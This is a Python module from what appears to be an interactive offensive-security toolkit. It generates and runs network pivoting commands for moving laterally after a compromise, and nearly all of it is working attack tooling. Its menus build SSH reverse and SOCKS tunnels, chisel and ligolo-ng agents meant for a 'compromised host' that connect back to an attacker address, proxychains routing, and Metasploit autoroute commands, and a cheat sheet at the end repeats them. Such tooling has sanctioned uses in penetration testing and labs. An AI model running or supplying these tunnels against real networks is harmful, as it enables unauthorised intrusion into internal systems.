"""Pivoting Module - SSH tunnels, chisel, ligolo-ng, SOCKS proxies for lateral movement."""

import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))

from ui import (console, show_stage_header, show_menu, ask, info, success,
                warning, error, confirm, show_results_panel, show_knowledge)
from executor import run_with_preview, run_command

STAGE = "pivot"


def _ssh_tunnels(session):
    """SSH port forwarding and SOCKS proxy."""
    options = [
        ("1", "[bold]Local Forward[/bold]   - Access remote service locally (-L)"),
        ("2", "[bold]Remote Forward[/bold]  - Expose local service remotely (-R)"),
        ("3", "[bold]Dynamic SOCKS[/bold]   - SOCKS proxy via SSH (-D)"),
        ("4", "[bold]SSH over HTTP[/bold]   - Tunnel SSH through HTTP proxy"),
        ("5", "[bold]Reverse SSH[/bold]     - Reverse tunnel back to attacker"),
    ]
    choice = show_menu(options)

    if choice == "1":
        lport = ask("Local port to listen on", default="8080")
        rhost = ask("Remote host to reach (from pivot)", default="127.0.0.1")
        rport = ask("Remote port to reach", default="80")
        user = ask("SSH user")
        pivot = ask("SSH pivot host")
        cmd = f"ssh -L {lport}:{rhost}:{rport} {user}@{pivot} -N -f"
        info(f"After connect: access {rhost}:{rport} via localhost:{lport}")
        run_with_preview(cmd, session, STAGE)

    elif choice == "2":
        rport = ask("Remote port on pivot", default="8080")
        lhost = ask("Local host", default="127.0.0.1")
        lport = ask("Local port", default="80")
        user = ask("SSH user")
        pivot = ask("SSH pivot host")
        cmd = f"ssh -R {rport}:{lhost}:{lport} {user}@{pivot} -N -f"
        info(f"After connect: {pivot}:{rport} → your {lhost}:{lport}")
        run_with_preview(cmd, session, STAGE)

    elif choice == "3":
        lport = ask("Local SOCKS port", default="1080")
        user = ask("SSH user")
        pivot = ask("SSH pivot host")
        cmd = f"ssh -D {lport} {user}@{pivot} -N -f"
        info(f"SOCKS proxy on localhost:{lport}")
        info(f"Use: proxychains nmap -sT target OR curl --socks5 127.0.0.1:{lport} http://target")
        run_with_preview(cmd, session, STAGE)

    elif choice == "4":
        proxy = ask("HTTP proxy (host:port)")
        user = ask("SSH user")
        target = ask("SSH target host")
        cmd = f"ssh -o ProxyCommand='nc -X connect -x {proxy} %h %p' {user}@{target}"
        run_with_preview(cmd, session, STAGE)

    elif choice == "5":
        lport = ask("Port on your machine to receive tunnel", default="2222")
        user = ask("Your SSH user")
        attacker = ask("Your SSH host/IP")
        info("Run this on the compromised host:")
        cmd = f"ssh -R {lport}:127.0.0.1:22 {user}@{attacker} -N -f"
        console.print(f"\n  [bold green]{cmd}[/bold green]\n")
        info(f"Then connect: ssh -p {lport} user@127.0.0.1")


def _chisel(session):
    """Chisel TCP tunnel setup."""
    options = [
        ("1", "[bold]Chisel Server[/bold]   - Start on attacker"),
        ("2", "[bold]Chisel Client[/bold]   - Run on target (forward)"),
        ("3", "[bold]Chisel Reverse[/bold]  - Reverse tunnel (target → attacker)"),
        ("4", "[bold]Chisel SOCKS[/bold]    - SOCKS proxy via chisel"),
    ]
    choice = show_menu(options)

    if choice == "1":
        port = ask("Server listen port", default="8000")
        cmd = f"chisel server -p {port} --reverse"
        run_with_preview(cmd, session, STAGE)

    elif choice == "2":
        server = ask("Chisel server address (ip:port)")
        lport = ask("Local port on target")
        rhost = ask("Remote host to reach")
        rport = ask("Remote port to reach")
        cmd = f"chisel client {server} {lport}:{rhost}:{rport}"
        run_with_preview(cmd, session, STAGE)

    elif choice == "3":
        server = ask("Chisel server address (ip:port)")
        lport = ask("Port on attacker to listen")
        rhost = ask("Internal host to reach from target", default="127.0.0.1")
        rport = ask("Internal port to reach")
        cmd = f"chisel client {server} R:{lport}:{rhost}:{rport}"
        info("Run on target. Attacker accesses internal service on localhost:{lport}")
        run_with_preview(cmd, session, STAGE)

    elif choice == "4":
        server = ask("Chisel server address (ip:port)")
        cmd = f"chisel client {server} R:1080:socks"
        info("Creates SOCKS5 proxy on attacker at port 1080")
        run_with_preview(cmd, session, STAGE)


def _ligolo(session):
    """Ligolo-ng tunnel setup."""
    options = [
        ("1", "[bold]Proxy (attacker)[/bold] - Start ligolo proxy"),
        ("2", "[bold]Agent (target)[/bold]   - Run agent on compromised host"),
        ("3", "[bold]Setup guide[/bold]      - Step-by-step instructions"),
    ]
    choice = show_menu(options)

    if choice == "1":
        iface = ask("TUN interface name", default="ligolo")
        cmd = f"ip tuntap add user $(whoami) mode tun {iface} && ip link set {iface} up"
        run_with_preview(cmd, session, STAGE)
        cmd2 = f"./proxy -selfcert -laddr 0.0.0.0:11601"
        run_with_preview(cmd2, session, STAGE)

    elif choice == "2":
        server = ask("Ligolo proxy address (ip:port)", default="attacker:11601")
        cmd = f"./agent -connect {server} -ignore-cert"
        info("Run this on the compromised target:")
        console.print(f"\n  [bold green]{cmd}[/bold green]\n")

    elif choice == "3":
        info("""Ligolo-ng Setup:

1. ATTACKER: Create TUN interface
   ip tuntap add user $(whoami) mode tun ligolo
   ip link set ligolo up

2. ATTACKER: Start proxy
   ./proxy -selfcert -laddr 0.0.0.0:11601

3. TARGET: Run agent
   ./agent -connect ATTACKER:11601 -ignore-cert

4. ATTACKER (in proxy): Select session & start
   session
   start

5. ATTACKER: Add route to internal network
   ip route add 10.10.10.0/24 dev ligolo

6. Now scan/access 10.10.10.0/24 directly from attacker!""")


def _proxychains(session):
    """Configure and use proxychains."""
    options = [
        ("1", "[bold]Edit config[/bold]    - View/edit proxychains.conf"),
        ("2", "[bold]Add SOCKS proxy[/bold]- Quick add to config"),
        ("3", "[bold]Test proxy[/bold]     - Verify proxy works"),
        ("4", "[bold]Run through proxy[/bold]- Execute command via proxychains"),
    ]
    choice = show_menu(options)

    if choice == "1":
        run_with_preview("cat /etc/proxychains4.conf 2>/dev/null || cat /etc/proxychains.conf 2>/dev/null", session, STAGE)

    elif choice == "2":
        proxy_type = ask("Proxy type (socks4/socks5/http)", default="socks5")
        host = ask("Proxy host", default="127.0.0.1")
        port = ask("Proxy port", default="1080")
        line = f"{proxy_type} {host} {port}"
        conf = "/etc/proxychains4.conf"
        if not os.path.isfile(conf):
            conf = "/etc/proxychains.conf"
        cmd = f'echo "{line}" >> {conf}'
        run_with_preview(cmd, session, STAGE)

    elif choice == "3":
        cmd = "proxychains4 curl -s http://ifconfig.me 2>/dev/null || proxychains curl -s http://ifconfig.me"
        run_with_preview(cmd, session, STAGE)

    elif choice == "4":
        command = ask("Enter command to run through proxychains")
        if command:
            cmd = f"proxychains4 {command} 2>/dev/null || proxychains {command}"
            run_with_preview(cmd, session, STAGE)


def _metasploit_pivot(session):
    """Metasploit autoroute and port forwarding."""
    info("Metasploit Pivoting Commands:")
    cmds = [
        ("Add route via session", "run autoroute -s 10.10.10.0/24"),
        ("List routes", "run autoroute -p"),
        ("SOCKS proxy", "use auxiliary/server/socks_proxy; set SRVPORT 1080; run -j"),
        ("Port forward", "portfwd add -l 8080 -p 80 -r 10.10.10.100"),
        ("List forwards", "portfwd list"),
        ("Delete forward", "portfwd delete -l 8080 -p 80 -r 10.10.10.100"),
    ]

    from rich.table import Table
    table = Table(title="Metasploit Pivoting", show_header=True)
    table.add_column("Action", style="cyan")
    table.add_column("Command", style="green")

    for action, cmd in cmds:
        table.add_row(action, cmd)

    console.print(table)


def _cheat_sheet():
    content = """# Pivoting Cheat Sheet

## SSH Tunnels
```
# Local forward: access remote:80 via localhost:8080
ssh -L 8080:remote:80 user@pivot -N

# Dynamic SOCKS proxy
ssh -D 1080 user@pivot -N

# Reverse tunnel
ssh -R 4444:localhost:22 user@attacker -N
```

## Chisel
```
# Attacker: chisel server -p 8000 --reverse
# Target:   chisel client attacker:8000 R:1080:socks
# Target:   chisel client attacker:8000 R:8080:internal:80
```

## Ligolo-ng
```
# Attacker: ./proxy -selfcert
# Target:   ./agent -connect attacker:11601 -ignore-cert
# Attacker: ip route add 10.0.0.0/24 dev ligolo
```

## Proxychains
```
# Add to /etc/proxychains4.conf:
# socks5 127.0.0.1 1080
proxychains nmap -sT -Pn target
proxychains curl http://internal-target
```

## Tools: ssh, chisel, ligolo-ng, proxychains, socat, plink
"""
    show_knowledge(content)


def run(session):
    """Pivoting module entry point."""
    show_stage_header("Pivoting", "SSH tunnels, chisel, ligolo-ng, proxychains — move through networks")

    while True:
        options = [
            ("1", "[bold]SSH Tunnels[/bold]      - Local/remote/dynamic forwarding"),
            ("2", "[bold]Chisel[/bold]           - TCP tunnel over HTTP"),
            ("3", "[bold]Ligolo-ng[/bold]        - TUN-based pivoting"),
            ("4", "[bold]Proxychains[/bold]      - SOCKS proxy routing"),
            ("5", "[bold]Metasploit Pivot[/bold] - Autoroute & port forward"),
            ("6", "[bold]Cheat Sheet[/bold]      - Pivoting reference"),
            ("0", "[bold]Back to Main Menu[/bold]"),
        ]
        choice = show_menu(options)

        if choice == "0":
            return
        elif choice == "1":
            _ssh_tunnels(session)
        elif choice == "2":
            _chisel(session)
        elif choice == "3":
            _ligolo(session)
        elif choice == "4":
            _proxychains(session)
        elif choice == "5":
            _metasploit_pivot(session)
        elif choice == "6":
            _cheat_sheet()
